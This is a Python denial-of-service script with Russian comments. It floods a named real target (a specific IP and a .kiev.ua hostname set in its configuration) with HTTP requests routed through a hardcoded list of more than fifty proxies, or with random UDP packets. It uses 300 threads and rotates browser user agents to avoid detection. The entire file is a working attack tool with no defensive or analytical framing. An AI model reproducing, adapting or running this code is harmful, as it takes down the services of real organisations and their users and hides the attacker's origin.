import requests
import threading
import random
import time
import socket
import sys
from concurrent.futures import ThreadPoolExecutor

# ===== КОНФИГ (замени под себя) =====
TARGET_IP = "195.138.82.146"          # Сюда впиши IP, который нашёл
TARGET_PORT = 443                     # 80 для http, 443 для https
PROTOCOL = "https"                    # http или https
TARGET_HOST = "sofbor-nvk.kiev.ua"    # Host-заголовок, можно оставить как есть
REQUEST_PATH = "/"                    # путь, например /wp-login.php

# Режим атаки: "http" или "udp"
ATTACK_MODE = "http"                  # http - HTTP-флуд, udp - UDP-флуд

THREADS = 300                         # количество потоков
REQUEST_DELAY = 0.01                  # задержка между запросами в одном потоке
TIMEOUT = 5                           # таймаут для HTTP
UDP_PAYLOAD_SIZE = 1024               # размер UDP-пакета
# =====================================

# Встроенный список прокси (можно расширить)
PROXY_LIST = [
    "http://45.155.68.129:8080",
    "http://45.155.68.130:8080",
    "http://45.155.68.131:8080",
    "http://45.155.68.132:8080",
    "http://45.155.68.133:8080",
    "http://20.111.54.16:80",
    "http://20.111.54.17:80",
    "http://20.111.54.18:80",
    "http://20.111.54.19:80",
    "http://20.111.54.20:80",
    "http://13.58.98.142:80",
    "http://13.58.98.143:80",
    "http://13.58.98.144:80",
    "http://13.58.98.145:80",
    "http://13.58.98.146:80",
    "http://103.152.112.157:80",
    "http://103.152.112.158:80",
    "http://103.152.112.159:80",
    "http://103.152.112.160:80",
    "http://103.152.112.161:80",
    "http://47.251.43.113:33333",
    "http://47.251.43.114:33333",
    "http://47.251.43.115:33333",
    "http://47.251.43.116:33333",
    "http://47.251.43.117:33333",
    "http://183.236.232.160:8080",
    "http://183.236.232.161:8080",
    "http://183.236.232.162:8080",
    "http://183.236.232.163:8080",
    "http://183.236.232.164:8080",
    "http://118.69.189.45:8080",
    "http://118.69.189.46:8080",
    "http://118.69.189.47:8080",
    "http://118.69.189.48:8080",
    "http://118.69.189.49:8080",
    "http://122.155.169.238:8080",
    "http://122.155.169.239:8080",
    "http://122.155.169.240:8080",
    "http://122.155.169.241:8080",
    "http://122.155.169.242:8080",
    "http://203.190.10.210:8080",
    "http://203.190.10.211:8080",
    "http://203.190.10.212:8080",
    "http://203.190.10.213:8080",
    "http://203.190.10.214:8080",
    "http://178.72.90.18:8080",
    "http://178.72.90.19:8080",
    "http://178.72.90.20:8080",
    "http://178.72.90.21:8080",
    "http://178.72.90.22:8080",
    "http://79.137.204.154:8080",
    "http://79.137.204.155:8080",
    "http://79.137.204.156:8080",
    "http://79.137.204.157:8080",
    "http://79.137.204.158:8080",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
]

proxy_pool = PROXY_LIST.copy()
proxy_lock = threading.Lock()

def get_random_proxy():
    with proxy_lock:
        if not proxy_pool:
            return None
        return random.choice(proxy_pool)

def build_url():
    if PROTOCOL == "https":
        return f"https://{TARGET_IP}:{TARGET_PORT}{REQUEST_PATH}"
    else:
        return f"http://{TARGET_IP}:{TARGET_PORT}{REQUEST_PATH}"

def http_worker():
    session = requests.Session()
    url = build_url()
    while True:
        proxy = get_random_proxy()
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Host": TARGET_HOST,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Connection": "close"
        }
        try:
            if proxy:
                session.get(url, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=TIMEOUT, verify=False)
            else:
                session.get(url, headers=headers, timeout=TIMEOUT, verify=False)
        except:
            pass
        time.sleep(REQUEST_DELAY)

def udp_worker():
    # Создаём сокет для UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(UDP_PAYLOAD_SIZE)  # случайный мусор
    while True:
        try:
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        except:
            pass
        time.sleep(0.001)  # минимальная задержка для предотвращения полной загрузки CPU

def main():
    print(f"[i] Цель IP: {TARGET_IP}:{TARGET_PORT}")
    print(f"[i] Протокол: {PROTOCOL}, Host: {TARGET_HOST}")
    print(f"[i] Режим атаки: {ATTACK_MODE.upper()}")
    print(f"[i] Потоков: {THREADS}")
    print(f"[i] Прокси загружено: {len(proxy_pool)}")

    if ATTACK_MODE.lower() == "udp":
        print("[i] Запуск UDP-флуда...")
        worker_func = udp_worker
    else:
        print("[i] Запуск HTTP-флуда...")
        worker_func = http_worker

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for _ in range(THREADS):
            executor.submit(worker_func)

    while True:
        time.sleep(60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Остановлено.")